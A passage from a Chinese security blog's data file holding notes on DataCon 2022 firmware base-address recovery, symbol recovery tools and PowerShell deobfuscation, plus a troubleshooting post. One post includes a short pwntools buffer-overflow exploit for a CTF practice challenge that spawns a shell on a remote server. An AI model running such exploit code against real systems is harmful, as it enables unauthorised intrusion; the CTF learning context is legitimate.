lscan项目里自带的一些静态库是可以成功运行的，但是我试了一下写的静态库，例如sigdatabase <https://github.com/push0ebp/sig-database> 运行会报错\n\n   然后还有一个很奇怪的点在于匹配时对于某个库的相似度会超过百分之100%（在lscan的issue里也有人提到），但实际用ida的flirt打开时这个库并不能很好地匹配分析文件\n\n3. Rizzo\n\n   没实际测试过，略\n\n4. finger\n\n   finger是阿里云开发的ida插件  -  <https://github.com/aliyunav/Finger>\n\n   用起来很简单\n\n5. lumina \n\n   没有测试过，ida的一个官方符号识别插件，需要远程连接到ida lumina的服务器\n\n   有一个山寨版的服务器lumen，可以替代lumina，但好像现在已经不好使了\n\n##### 在datacon符号恢复数据集上的实测\n\n给了20个程序，只有一个x86的程序，用finger基本能识别出来，有几个arm、mips的程序，还有其他很多奇奇怪怪的平台ida都反汇编不了，跟不用说符号恢复了，寄\n\n\n\n#### powershell反混淆\n\nPowerDecode  -  <https://github.com/Malandrone/PowerDecode>\n\n对于单个文件反混淆很好用，而且实测比下边那个工具效果要好\n\n但是问题在于，它提供的“分析整个文件夹下所有文件”功能，输出结果全是 1.txt 2.txt 3.txt .....\n\n然后这些txt里也看不出来对应着哪个pwsh脚本，一开始想着是不是文件名称排列的顺序，但好像不对，代码全是powershell写的，也没搞懂该咋办\n\n因此只能换了第二个工具\n\nPSDecode - https://github.com/R3MRUM/PSDecode \n\n会在TEMP路径下留下解析过程中各个layer的数据\n\n![](/img/datacon/2.jpg)","slug":"杂项/菜鸡的2022datacon","published":1,"updated":"2022-12-23T08:46:39.291Z","_id":"clc0969gu000x78uf8xbmdatn","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"固件基地址识别\"><a href=\"#固件基地址识别\" class=\"headerlink\" title=\"固件基地址识别\"></a>固件基地址识别</h4><p>rbasefind - <a href=\"https://github.com/sgayou/rbasefind\">https://github.com/sgayou/rbasefind</a></p>\n<p>此项目用rust写的，用<code>cargo build</code>之后会生成可执行文件在<code>target</code>路径下</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">rbasefind &lt;<span class=\"hljs-type\">path</span>-<span class=\"hljs-keyword\">to</span>-bin&gt; <br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\">Located 4052 strings<br>Located 197089 pointers<br>Scanning with 2 threads...<br>0x2c0dc000: 3818<br>0x2c0dd000: 280<br>0x2c0db000: 274<br>0x2c0da000: 232<br>0x2c0de000: 228<br>0x2c0d7000: 202<br>0x2c0d9000: 200<br>0x2c0df000: 199<br>0x2c0e1000: 184<br>0x2c0e6000: 181<br></code></pre></td></tr></table></figure>\n\n<p>通常来讲第一行（也就是数字最大的那个）为固件的基地址，但是很多时候识别不出来（比如几行都是1）</p>\n<p>实际在datacon的数据上测试的结果，使用的时候所有参数都是default（因为当时并没有仔细看代码….）</p>\n<p><img src=\"/img/datacon/1.jpg\"></p>\n<p>应该是50个固件识别成功了38个</p>\n<h5 id=\"对rbasefind源码的分析\"><a href=\"#对rbasefind源码的分析\" class=\"headerlink\" title=\"对rbasefind源码的分析\"></a>对rbasefind源码的分析</h5><p>按程序执行顺序分析</p>\n<ol>\n<li><p><code>get_strings()</code></p>\n<p>利用一个正则表达式匹配</p>\n<figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs taggerscript\">[ -~<span class=\"hljs-symbol\">\\t</span>\\r<span class=\"hljs-symbol\">\\n</span>]&#123;10,&#125;  // 从空格(48)到制表符(126) 以及 \\r<span class=\"hljs-symbol\">\\n</span> 的所有有效字符 <br></code></pre></td></tr></table></figure>\n\n<p>长度至少是10的字符串（10为参数minstrlen，最小字符串搜索长度）</p>\n</li>\n<li><p><code>get_pointers()</code></p>\n<p>提取整个文件的u32（？），会根据参数<code>big_endian</code>判断文件的大小端</p>\n</li>\n<li><p><code>find_match() -&gt; Interval::get_range()</code></p>\n<p>把32位地址空间平均分为n部分，n位参数的threads（开启的线程数）</p>\n</li>\n<li><p>每一个interval对应一个线程，以offset字节为一组（offset为输入的参数，默认为4096）</p>\n</li>\n<li><p>下面的代码中current_addr遍历了<code> [interval.start_addr : interval.end_addr : offset]</code></p>\n<p>将每个str的首地址加上current_addr，把这些地址和pointers集合取交集</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs rust\"><span class=\"hljs-keyword\">while</span> current_addr &lt;= interval.end_addr &#123;<br>    <span class=\"hljs-keyword\">let</span> <span class=\"hljs-keyword\">mut </span><span class=\"hljs-variable\">news</span> = FnvHashSet::<span class=\"hljs-title function_ invoke__\">default</span>();<br>    <span class=\"hljs-keyword\">for</span> <span class=\"hljs-variable\">s</span> <span class=\"hljs-keyword\">in</span> strings &#123;<br>        <span class=\"hljs-keyword\">match</span> s.<span class=\"hljs-title function_ invoke__\">checked_add</span>(current_addr) &#123;<br>            <span class=\"hljs-title function_ invoke__\">Some</span>(add) =&gt; news.<span class=\"hljs-title function_ invoke__\">insert</span>(add),<br>            <span class=\"hljs-literal\">None</span> =&gt; <span class=\"hljs-keyword\">continue</span>,<br>        &#125;;<br>    &#125;<br>    <span class=\"hljs-keyword\">let</span> <span class=\"hljs-variable\">intersection</span>: FnvHashSet&lt;_&gt; = news.<span class=\"hljs-title function_ invoke__\">intersection</span>(pointers).<span class=\"hljs-title function_ invoke__\">collect</span>();<br>    <span class=\"hljs-keyword\">if</span> !intersection.<span class=\"hljs-title function_ invoke__\">is_empty</span>() &#123;<br>        heap.<span class=\"hljs-title function_ invoke__\">push</span>((intersection.<span class=\"hljs-title function_ invoke__\">len</span>(), current_addr));<br>    &#125;<br>    <span class=\"hljs-keyword\">match</span> current_addr.<span class=\"hljs-title function_ invoke__\">checked_add</span>(config.offset) &#123;<br>        <span class=\"hljs-title function_ invoke__\">Some</span>(_) =&gt; current_addr += config.offset,<br>        <span class=\"hljs-literal\">None</span> =&gt; <span class=\"hljs-keyword\">break</span>,<br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure></li>\n<li><p>取出交集size最大的top n个current_addr进行输出</p>\n<p>见本节最开头的示例，输出格式为 addr :  interaction_size</p>\n<p>size最大的即认为是最有可能的基地址</p>\n<p><strong>目前尚不清楚这样做的道理是什么</strong></p>\n<p>猜测：首先，基地址是一个offset的倍数，那么遍历0~2^32所有offset的倍数（也就是current_offset），字符串在程序运行时会被装载到基地址后面的一段空间内，而pointers里会有很多指向字符串真实地址的指针，如果能将strings和pointers匹配上很多，说明这个current_addr就是程序的基地址</p>\n<p>（纯瞎猜💔）</p>\n</li>\n</ol>\n<h4 id=\"函数符号恢复\"><a href=\"#函数符号恢复\" class=\"headerlink\" title=\"函数符号恢复\"></a>函数符号恢复</h4><h5 id=\"几个已知的方法\"><a href=\"#几个已知的方法\" class=\"headerlink\" title=\"几个已知的方法\"></a>几个已知的方法</h5><p>我认为这篇文章写的很不错 <a href=\"https://blog.csdn.net/abel_big_xu/article/details/124388798\">https://blog.csdn.net/abel_big_xu/article/details/124388798</a></p>\n<ol>\n<li><p>FLIRT</p>\n<p>ida自带的一个插件，FLIRT可以对某个静态函数库生成签名，然后和待分析的程序匹配</p>\n<p>缺点在于需要已知库函数文件</p>\n</li>\n<li><p>lscan   </p>\n<p><a href=\"https://github.com/maroueneboubakri/lscan\">https://github.com/maroueneboubakri/lscan</a>（我和前面挂着的那篇csdn文章作者一样，没搞懂这个工具）</p>\n<p>lscan算是对flirt进行了一个包装，只要把一堆静态库放在一个文件夹里，他会遍历这个文件夹对每个静态库生成签名，然后再用FLIRT进行比对</p>\n<p>lscan项目里自带的一些静态库是可以成功运行的，但是我试了一下写的静态库，例如sigdatabase <a href=\"https://github.com/push0ebp/sig-database\">https://github.com/push0ebp/sig-database</a> 运行会报错</p>\n<p>然后还有一个很奇怪的点在于匹配时对于某个库的相似度会超过百分之100%（在lscan的issue里也有人提到），但实际用ida的flirt打开时这个库并不能很好地匹配分析文件</p>\n</li>\n<li><p>Rizzo</p>\n<p>没实际测试过，略</p>\n</li>\n<li><p>finger</p>\n<p>finger是阿里云开发的ida插件  -  <a href=\"https://github.com/aliyunav/Finger\">https://github.com/aliyunav/Finger</a></p>\n<p>用起来很简单</p>\n</li>\n<li><p>lumina </p>\n<p>没有测试过，ida的一个官方符号识别插件，需要远程连接到ida lumina的服务器</p>\n<p>有一个山寨版的服务器lumen，可以替代lumina，但好像现在已经不好使了</p>\n</li>\n</ol>\n<h5 id=\"在datacon符号恢复数据集上的实测\"><a href=\"#在datacon符号恢复数据集上的实测\" class=\"headerlink\" title=\"在datacon符号恢复数据集上的实测\"></a>在datacon符号恢复数据集上的实测</h5><p>给了20个程序，只有一个x86的程序，用finger基本能识别出来，有几个arm、mips的程序，还有其他很多奇奇怪怪的平台ida都反汇编不了，跟不用说符号恢复了，寄</p>\n<h4 id=\"powershell反混淆\"><a href=\"#powershell反混淆\" class=\"headerlink\" title=\"powershell反混淆\"></a>powershell反混淆</h4><p>PowerDecode  -  <a href=\"https://github.com/Malandrone/PowerDecode\">https://github.com/Malandrone/PowerDecode</a></p>\n<p>对于单个文件反混淆很好用，而且实测比下边那个工具效果要好</p>\n<p>但是问题在于，它提供的“分析整个文件夹下所有文件”功能，输出结果全是 1.txt 2.txt 3.txt …..</p>\n<p>然后这些txt里也看不出来对应着哪个pwsh脚本，一开始想着是不是文件名称排列的顺序，但好像不对，代码全是powershell写的，也没搞懂该咋办</p>\n<p>因此只能换了第二个工具</p>\n<p>PSDecode - <a href=\"https://github.com/R3MRUM/PSDecode\">https://github.com/R3MRUM/PSDecode</a> </p>\n<p>会在TEMP路径下留下解析过程中各个layer的数据</p>\n<p><img src=\"/img/datacon/2.jpg\"></p>\n","site":{"data":{}},"more":"<h4 id=\"固件基地址识别\"><a href=\"#固件基地址识别\" class=\"headerlink\" title=\"固件基地址识别\"></a>固件基地址识别</h4><p>rbasefind - <a href=\"https://github.com/sgayou/rbasefind\">https://github.com/sgayou/rbasefind</a></p>\n<p>此项目用rust写的，用<code>cargo build</code>之后会生成可执行文件在<code>target</code>路径下</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">rbasefind &lt;<span class=\"hljs-type\">path</span>-<span class=\"hljs-keyword\">to</span>-bin&gt; <br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\">Located 4052 strings<br>Located 197089 pointers<br>Scanning with 2 threads...<br>0x2c0dc000: 3818<br>0x2c0dd000: 280<br>0x2c0db000: 274<br>0x2c0da000: 232<br>0x2c0de000: 228<br>0x2c0d7000: 202<br>0x2c0d9000: 200<br>0x2c0df000: 199<br>0x2c0e1000: 184<br>0x2c0e6000: 181<br></code></pre></td></tr></table></figure>\n\n<p>通常来讲第一行（也就是数字最大的那个）为固件的基地址，但是很多时候识别不出来（比如几行都是1）</p>\n<p>实际在datacon的数据上测试的结果，使用的时候所有参数都是default（因为当时并没有仔细看代码….）</p>\n<p><img src=\"/img/datacon/1.jpg\"></p>\n<p>应该是50个固件识别成功了38个</p>\n<h5 id=\"对rbasefind源码的分析\"><a href=\"#对rbasefind源码的分析\" class=\"headerlink\" title=\"对rbasefind源码的分析\"></a>对rbasefind源码的分析</h5><p>按程序执行顺序分析</p>\n<ol>\n<li><p><code>get_strings()</code></p>\n<p>利用一个正则表达式匹配</p>\n<figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs taggerscript\">[ -~<span class=\"hljs-symbol\">\\t</span>\\r<span class=\"hljs-symbol\">\\n</span>]&#123;10,&#125;  // 从空格(48)到制表符(126) 以及 \\r<span class=\"hljs-symbol\">\\n</span> 的所有有效字符 <br></code></pre></td></tr></table></figure>\n\n<p>长度至少是10的字符串（10为参数minstrlen，最小字符串搜索长度）</p>\n</li>\n<li><p><code>get_pointers()</code></p>\n<p>提取整个文件的u32（？），会根据参数<code>big_endian</code>判断文件的大小端</p>\n</li>\n<li><p><code>find_match() -&gt; Interval::get_range()</code></p>\n<p>把32位地址空间平均分为n部分，n位参数的threads（开启的线程数）</p>\n</li>\n<li><p>每一个interval对应一个线程，以offset字节为一组（offset为输入的参数，默认为4096）</p>\n</li>\n<li><p>下面的代码中current_addr遍历了<code> [interval.start_addr : interval.end_addr : offset]</code></p>\n<p>将每个str的首地址加上current_addr，把这些地址和pointers集合取交集</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs rust\"><span class=\"hljs-keyword\">while</span> current_addr &lt;= interval.end_addr &#123;<br>    <span class=\"hljs-keyword\">let</span> <span class=\"hljs-keyword\">mut </span><span class=\"hljs-variable\">news</span> = FnvHashSet::<span class=\"hljs-title function_ invoke__\">default</span>();<br>    <span class=\"hljs-keyword\">for</span> <span class=\"hljs-variable\">s</span> <span class=\"hljs-keyword\">in</span> strings &#123;<br>        <span class=\"hljs-keyword\">match</span> s.<span class=\"hljs-title function_ invoke__\">checked_add</span>(current_addr) &#123;<br>            <span class=\"hljs-title function_ invoke__\">Some</span>(add) =&gt; news.<span class=\"hljs-title function_ invoke__\">insert</span>(add),<br>            <span class=\"hljs-literal\">None</span> =&gt; <span class=\"hljs-keyword\">continue</span>,<br>        &#125;;<br>    &#125;<br>    <span class=\"hljs-keyword\">let</span> <span class=\"hljs-variable\">intersection</span>: FnvHashSet&lt;_&gt; = news.<span class=\"hljs-title function_ invoke__\">intersection</span>(pointers).<span class=\"hljs-title function_ invoke__\">collect</span>();<br>    <span class=\"hljs-keyword\">if</span> !intersection.<span class=\"hljs-title function_ invoke__\">is_empty</span>() &#123;<br>        heap.<span class=\"hljs-title function_ invoke__\">push</span>((intersection.<span class=\"hljs-title function_ invoke__\">len</span>(), current_addr));<br>    &#125;<br>    <span class=\"hljs-keyword\">match</span> current_addr.<span class=\"hljs-title function_ invoke__\">checked_add</span>(config.offset) &#123;<br>        <span class=\"hljs-title function_ invoke__\">Some</span>(_) =&gt; current_addr += config.offset,<br>        <span class=\"hljs-literal\">None</span> =&gt; <span class=\"hljs-keyword\">break</span>,<br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure></li>\n<li><p>取出交集size最大的top n个current_addr进行输出</p>\n<p>见本节最开头的示例，输出格式为 addr :  interaction_size</p>\n<p>size最大的即认为是最有可能的基地址</p>\n<p><strong>目前尚不清楚这样做的道理是什么</strong></p>\n<p>猜测：首先，基地址是一个offset的倍数，那么遍历0~2^32所有offset的倍数（也就是current_offset），字符串在程序运行时会被装载到基地址后面的一段空间内，而pointers里会有很多指向字符串真实地址的指针，如果能将strings和pointers匹配上很多，说明这个current_addr就是程序的基地址</p>\n<p>（纯瞎猜💔）</p>\n</li>\n</ol>\n<h4 id=\"函数符号恢复\"><a href=\"#函数符号恢复\" class=\"headerlink\" title=\"函数符号恢复\"></a>函数符号恢复</h4><h5 id=\"几个已知的方法\"><a href=\"#几个已知的方法\" class=\"headerlink\" title=\"几个已知的方法\"></a>几个已知的方法</h5><p>我认为这篇文章写的很不错 <a href=\"https://blog.csdn.net/abel_big_xu/article/details/124388798\">https://blog.csdn.net/abel_big_xu/article/details/124388798</a></p>\n<ol>\n<li><p>FLIRT</p>\n<p>ida自带的一个插件，FLIRT可以对某个静态函数库生成签名，然后和待分析的程序匹配</p>\n<p>缺点在于需要已知库函数文件</p>\n</li>\n<li><p>lscan   </p>\n<p><a href=\"https://github.com/maroueneboubakri/lscan\">https://github.com/maroueneboubakri/lscan</a>（我和前面挂着的那篇csdn文章作者一样，没搞懂这个工具）</p>\n<p>lscan算是对flirt进行了一个包装，只要把一堆静态库放在一个文件夹里，他会遍历这个文件夹对每个静态库生成签名，然后再用FLIRT进行比对</p>\n<p>lscan项目里自带的一些静态库是可以成功运行的，但是我试了一下写的静态库，例如sigdatabase <a href=\"https://github.com/push0ebp/sig-database\">https://github.com/push0ebp/sig-database</a> 运行会报错</p>\n<p>然后还有一个很奇怪的点在于匹配时对于某个库的相似度会超过百分之100%（在lscan的issue里也有人提到），但实际用ida的flirt打开时这个库并不能很好地匹配分析文件</p>\n</li>\n<li><p>Rizzo</p>\n<p>没实际测试过，略</p>\n</li>\n<li><p>finger</p>\n<p>finger是阿里云开发的ida插件  -  <a href=\"https://github.com/aliyunav/Finger\">https://github.com/aliyunav/Finger</a></p>\n<p>用起来很简单</p>\n</li>\n<li><p>lumina </p>\n<p>没有测试过，ida的一个官方符号识别插件，需要远程连接到ida lumina的服务器</p>\n<p>有一个山寨版的服务器lumen，可以替代lumina，但好像现在已经不好使了</p>\n</li>\n</ol>\n<h5 id=\"在datacon符号恢复数据集上的实测\"><a href=\"#在datacon符号恢复数据集上的实测\" class=\"headerlink\" title=\"在datacon符号恢复数据集上的实测\"></a>在datacon符号恢复数据集上的实测</h5><p>给了20个程序，只有一个x86的程序，用finger基本能识别出来，有几个arm、mips的程序，还有其他很多奇奇怪怪的平台ida都反汇编不了，跟不用说符号恢复了，寄</p>\n<h4 id=\"powershell反混淆\"><a href=\"#powershell反混淆\" class=\"headerlink\" title=\"powershell反混淆\"></a>powershell反混淆</h4><p>PowerDecode  -  <a href=\"https://github.com/Malandrone/PowerDecode\">https://github.com/Malandrone/PowerDecode</a></p>\n<p>对于单个文件反混淆很好用，而且实测比下边那个工具效果要好</p>\n<p>但是问题在于，它提供的“分析整个文件夹下所有文件”功能，输出结果全是 1.txt 2.txt 3.txt …..</p>\n<p>然后这些txt里也看不出来对应着哪个pwsh脚本，一开始想着是不是文件名称排列的顺序，但好像不对，代码全是powershell写的，也没搞懂该咋办</p>\n<p>因此只能换了第二个工具</p>\n<p>PSDecode - <a href=\"https://github.com/R3MRUM/PSDecode\">https://github.com/R3MRUM/PSDecode</a> </p>\n<p>会在TEMP路径下留下解析过程中各个layer的数据</p>\n<p><img src=\"/img/datacon/2.jpg\"></p>\n"},{"title":"遇到的奇奇怪怪问题汇总","date":"2022-11-29T13:35:00.000Z","excerpt":"解决或未解决的奇怪问题","_content":"\n**vmware自带的vmtools安装了也复制不进来**\n\n虚拟机执行命令\n\n```\nsudo apt-get install open-vm-tools-desktop\n```\n\n如果拖放文件的时候出现了\n\n![](/img/problems/1.jpg)\n\n```\nsudo gedit /etc/gdm3/custom.conf\n```\n\n将`WaylandEnable=false`注释掉\n\n据说是vmware还没有支持ubutnu22.04的默认桌面Wayland\n\n#### sleep ？\n\n题目：\n\n<https://buuoj.cn/challenges#mrctf2020_easyrop>\n\n本来是很简单的一个溢出\n\n```python\nfrom pwn import *\nfrom time import sleep\n#r = process('./mrctf2020_easyrop')\nr = remote('node4.buuoj.cn',25663)\nsystem_sh =0x000000000040072A\nr.sendline(b'2')\n#sleep(1)\nr.sendline(b'a'*0x300)\nr.sendline(b'7')\n#sleep(1)\nr.sendline(b'a'* 0x12 + p64(system_sh))\nr.interactive()\n```\n\n但是不加sleep无法通过\n\n有人说是python同时发送多个字符串时会合并(?)\n\n那什么时候情况下需要在sendline前面加一个sleep\n\n​    [已解决] 打本地不加应该没事，打远程的时候肯定会有一点延迟，假如没有sendafter这一类的发送，就可能会造成后面的也一起发送了，所以每次写exp发送的时候最好用sendafter或者sendlineafter这样的话就不需要再担心sleep(1)了\n\n----------------------------------------------------------------------------------\n\n\n\n#### binwalk提取固件时快捷方式指向/dev/null\n\nbinwalk提取固件时会有一个warning\n\n```\nWARNING: Symlink points outside of the extraction directory: /home/kali/Desktop/dir815_FW_101/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/squashfs-root/htdocs/web/dlcfg.cgi -> /htdocs/cgibin; changing link target to /dev/null for security purposes.\n```\n\n用到这个快捷方式时要修改一下\n\n\n\n#### sendlineafter的问题\n\n要加上换行符`\\n`，否则匹配不上\n\n```\np.sendlineafter(b'Input your Plaintext to be encrypted\\n',...)\n```\n\n\n\n","source":"_posts/杂项/遇到的奇奇怪怪问题汇总.md","raw":"---\ntitle: 遇到的奇奇怪怪问题汇总\ntags: [ctf-pwn,Others]\ndate: 2022-11-29 21:35:00\ncategories: [杂项]\nexcerpt: 解决或未解决的奇怪问题\n---\n\n**vmware自带的vmtools安装了也复制不进来**\n\n虚拟机执行命令\n\n```\nsudo apt-get install open-vm-tools-desktop\n```\n\n如果拖放文件的时候出现了\n\n![](/img/problems/1.jpg)\n\n```\nsudo gedit /etc/gdm3/custom.conf\n```\n\n将`WaylandEnable=false`注释掉\n\n据说是vmware还没有支持ubutnu22.04的默认桌面Wayland\n\n#### sleep ？\n\n题目：\n\n<https://buuoj.cn/challenges#mrctf2020_easyrop>\n\n本来是很简单的一个溢出\n\n```python\nfrom pwn import *\nfrom time import sleep\n#r = process('./mrctf2020_easyrop')\nr = remote('node4.buuoj.cn',25663)\nsystem_sh =0x000000000040072A\nr.sendline(b'2')\n#sleep(1)\nr.sendline(b'a'*0x300)\nr.sendline(b'7')\n#sleep(1)\nr.sendline(b'a'* 0x12 + p64(system_sh))\nr.interactive()\n```\n\n但是不加sleep无法通过\n\n有人说是python同时发送多个字符串时会合并(?)\n\n那什么时候情况下需要在sendline前面加一个sleep\n\n​    [已解决] 打本地不加应该没事，打远程的时候肯定会有一点延迟，假如没有sendafter这一类的发送，就可能会造成后面的也一起发送了，所以每次写exp发送的时候最好用sendafter或者sendlineafter这样的话就不需要再担心sleep(1)了\n\n----------------------------------------------------------------------------------\n\n\n\n#### binwalk提取固件时快捷方式指向/dev/null\n\nbinwalk提取固件时会有一个warning\n\n```\nWARNING: Symlink points outside of the extraction directory: /home/kali/Desktop/dir815_FW_101/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/squashfs-root/htdocs/web/dlcfg.cgi -> /htdocs/cgibin; changing link target to /dev/null for security purposes.\n```\n\n用到这个快捷方式时要修改一下\n\n\n\n#### sendlineafter的问题\n\n要加上换行符`\\n`，否则匹配不上\n\n```\np.sendlineafter(b'Input your Plaintext to be encrypted\\n',...)\n```\n\n\n\n","slug":"杂项/遇到的奇奇怪怪问题汇总","published":1,"updated":"2023-08-22T06:11:08.319Z","_id":"clc0969gv001078uf3j4r25px","comments":1,"layout":"post","photos":[],"link":"","content":"<p><strong>vmware自带的vmtools安装了也复制不进来</strong></p>\n<p>虚拟机执行命令</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vim\">sudo apt-<span class=\"hljs-built_in\">get</span> install <span class=\"hljs-keyword\">open</span>-<span class=\"hljs-keyword\">vm</span>-tools-desktop<br></code></pre></td></tr></table></figure>\n\n<p>如果拖放文件的时候出现了</p>\n<p><img src=\"/img/problems/1.jpg\"></p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">sudo gedit <span class=\"hljs-regexp\">/etc/g</span>dm3/custom.conf<br></code></pre></td></tr></table></figure>\n\n<p>将<code>WaylandEnable=false</code>注释掉</p>\n<p>据说是vmware还没有支持ubutnu22.04的默认桌面Wayland</p>\n<h4 id=\"sleep-？\"><a href=\"#sleep-？\" class=\"headerlink\" title=\"sleep ？\"></a>sleep ？</h4><p>题目：</p>\n<p><a href=\"https://buuoj.cn/challenges#mrctf2020_easyrop\">https://buuoj.cn/challenges#mrctf2020_easyrop</a></p>\n<p>本来是很简单的一个溢出</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> time <span class=\"hljs-keyword\">import</span> sleep<br><span class=\"hljs-comment\">#r = process(&#x27;./mrctf2020_easyrop&#x27;)</span><br>r = remote(<span class=\"hljs-string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"hljs-number\">25663</span>)<br>system_sh =<span class=\"hljs-number\">0x000000000040072A</span><br>r.sendline(<span class=\"hljs-string\">b&#x27;2&#x27;</span>)<br><span class=\"hljs-comment\">#sleep(1)</span><br>r.sendline(<span class=\"hljs-string\">b&#x27;a&#x27;</span>*<span class=\"hljs-number\">0x300</span>)<br>r.sendline(<span class=\"hljs-string\">b&#x27;7&#x27;</span>)<br><span class=\"hljs-comment\">#sleep(1)</span><br>r.sendline(<span class=\"hljs-string\">b&#x27;a&#x27;</span>* <span class=\"hljs-number\">0x12</span> + p64(system_sh))<br>r.interactive()<br></code></pre></td></tr></table></figure>\n\n<p>但是不加sleep无法通过</p>\n<p>有人说是python同时发送多个字符串时会合并(?)</p>\n<p>那什么时候情况下需要在sendline前面加一个sleep</p>\n<p>​    [已解决] 打本地不加应该没事，打远程的时候肯定会有一点延迟，假如没有sendafter这一类的发送，就可能会造成后面的也一起发送了，所以每次写exp发送的时候最好用sendafter或者sendlineafter这样的话就不需要再担心sleep(1)了</p>\n<hr>\n<h4 id=\"binwalk提取固件时快捷方式指向-dev-null\"><a href=\"#binwalk提取固件时快捷方式指向-dev-null\" class=\"headerlink\" title=\"binwalk提取固件时快捷方式指向/dev/null\"></a>binwalk提取固件时快捷方式指向/dev/null</h4><p>binwalk提取固件时会有一个warning</p>\n<figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gradle\">WARNING: Symlink points outside of the extraction directory: <span class=\"hljs-regexp\">/home/</span>kali<span class=\"hljs-regexp\">/Desktop/</span>dir815_FW_101<span class=\"hljs-regexp\">/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/</span>squashfs-root<span class=\"hljs-regexp\">/htdocs/</span>web<span class=\"hljs-regexp\">/dlcfg.cgi -&gt; /</span>htdocs<span class=\"hljs-regexp\">/cgibin; changing link target to /</span>dev/<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">for</span> security purposes.<br></code></pre></td></tr></table></figure>\n\n<p>用到这个快捷方式时要修改一下</p>\n<h4 id=\"sendlineafter的问题\"><a href=\"#sendlineafter的问题\" class=\"headerlink\" title=\"sendlineafter的问题\"></a>sendlineafter的问题</h4><p>要加上换行符<code>\\n</code>，否则匹配不上</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\"><span class=\"hljs-selector-tag\">p</span><span class=\"hljs-selector-class\">.sendlineafter</span>(b<span class=\"hljs-string\">&#x27;Input your Plaintext to be encrypted\\n&#x27;</span>,...)<br></code></pre></td></tr></table></figure>\n\n\n\n","site":{"data":{}},"more":"<p><strong>vmware自带的vmtools安装了也复制不进来</strong></p>\n<p>虚拟机执行命令</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vim\">sudo apt-<span class=\"hljs-built_in\">get</span> install <span class=\"hljs-keyword\">open</span>-<span class=\"hljs-keyword\">vm</span>-tools-desktop<br></code></pre></td></tr></table></figure>\n\n<p>如果拖放文件的时候出现了</p>\n<p><img src=\"/img/problems/1.jpg\"></p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 